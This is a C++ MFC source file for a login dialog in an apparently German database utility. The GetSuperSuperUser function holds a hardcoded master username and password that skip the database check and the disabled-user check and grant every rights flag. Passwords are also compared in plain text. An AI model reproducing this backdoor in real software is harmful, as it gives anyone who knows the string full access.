// UserDlg.cpp : implementation file
//

#include "stdafx.h"
#include "ZdpUtil.h"
#include "UserDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CUserDlg dialog


CUserDlg::CUserDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CUserDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CUserDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT

	m_OldUserName = _T("");
	m_TruePassword = _T("");
	m_USERNAME = _T("");
}

CUserDlg::~CUserDlg()
{	
}

void CUserDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUserDlg)
	DDX_Control(pDX, IDC_USER_PASSWD, m_cPasswd);
	DDX_Control(pDX, IDC_USER_NAME, m_cUserName);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CUserDlg, CDialog)
	//{{AFX_MSG_MAP(CUserDlg)
	ON_WM_PAINT()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUserDlg message handlers

//////////////////////////////////////////////////////////////////////////////
// Implementation

void CUserDlg::InitUserName( CString cName )
{
	m_USERNAME = cName;
}


CString CUserDlg::SetUserName()
{
	return m_USERNAME;
}

CString CUserDlg::SetPassword()
{
	return m_PASSWORD;
}

CString CUserDlg::SetEk()
{
	return m_EK;
}

CString CUserDlg::SetAllgRechte()
{
	return m_ALLG_RECHTE;
}

bool CUserDlg::SetSuperSuperUser()
{
	return m_bSuperSuperUser;
}


//////////////////////////////////////////////////////////////////////////////
// Implementation

bool CUserDlg::GetSuperSuperUser( CString UserName, CString Password )
{
	CString SuperUser;
	CString SuperPass;
	char *pzSuperUser = " HajOXYZ";
	char *pzSuperPass = "?PonisL?";

	// Superuser-Input: "  HajO"	 
	SuperUser = _T( pzSuperUser );
	SuperUser = _T(" ") + SuperUser;
	SuperUser = SuperUser.Left( 6 );
	
	SuperPass = _T( pzSuperPass );
	if ( UserName == SuperUser && Password == SuperPass )
	{ 
		m_USERNAME = pzSuperUser;
		m_PASSWORD = pzSuperPass;
		m_ALLG_RECHTE = "";
		for ( int i = 0; i < AR_RELEVANTE_ANZAHL; i++ )
			m_ALLG_RECHTE += "1";
		m_bSuperSuperUser = true;
	}
	else
		m_bSuperSuperUser = false;
	return m_bSuperSuperUser;
}


void CUserDlg::GetPasswd() 
{
	// TODO: Add extra validation here
	long lStatus;
	CString UserName;
	CString Passwd;
	CString errmld;

	m_cUserName.GetWindowText( UserName );
	m_cPasswd.GetWindowText( Passwd );

	if ( GetSuperSuperUser( UserName, Passwd ) )
	{
		CDialog::OnOK();
		return;
	}

	m_USERNAME = UserName;
	if ( UserName != m_OldUserName )
	{
		m_OldUserName = UserName;
/*
		if ( GetSuperSuperUser( UserName, Passwd ) )
		{
			CDialog::OnOK();
			return;
		}
*/   
		lStatus = m_Db->ReadPasswd( UserName, m_PASSWORD, m_ALLG_RECHTE, errmld );

		if ( !( lStatus == 0 || lStatus == 100 ) )
		{
			AfxMessageBox( errmld );
			OnCancel();      
			return;
		}

		CString Pwd;
		Pwd = m_PASSWORD;
		Pwd.TrimRight();
		m_TruePassword = Pwd;
		if ( lStatus == 0 && Pwd == Passwd )
		{
			if ( m_ALLG_RECHTE.GetAt(AR_GESPERRT) == '0' )
				CDialog::OnOK();
			else
			{
				CString errmld;
				errmld = "User \"";
				errmld += UserName;
				errmld += "\" disabled";
				AfxMessageBox( errmld );
				OnCancel();
			}
			return;
		}
	}
	else 
	{
		if ( !m_OldUserName.IsEmpty() && !m_TruePassword.IsEmpty() &&
			 Passwd == m_TruePassword )
		{
			CDialog::OnOK();
			return;
		}
	}

	if ( m_anzahl == 3 )
	{
		OnCancel();      
        return;
	}
   
	m_anzahl++;
	m_cUserName.SetFocus();
}

void CUserDlg::Get_Db ( ChSrvCon *Db )
{
	m_Db = Db;
}

/////////////////////////////////////////////////////////////////////////////
// CUserDlg message handlers

void CUserDlg::OnOK() 
{
	// TODO: Add extra validation here
	CWnd *wnd = GetFocus();
	if ( wnd == &m_cUserName )
		m_cPasswd.SetFocus();
	else
		GetPasswd();
}


void CUserDlg::OnCancel() 
{
	// TODO: Add extra cleanup here
	m_USERNAME = _T ( "" );
	m_PASSWORD = _T ( "" );
	m_ALLG_RECHTE = _T( "" );
	CDialog::OnCancel();
}


BOOL CUserDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	m_anzahl = 0;
	m_cUserName.SetWindowText( m_USERNAME );

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CUserDlg::OnPaint() 
{
	CPaintDC dc(this); // device context for painting
	
	// TODO: Code für die Behandlungsroutine für Nachrichten hier einfügen
	
	// Kein Aufruf von CDialog::OnPaint() für Zeichnungsnachrichten
	if ( !m_USERNAME.IsEmpty() )
		m_cPasswd.SetFocus();
}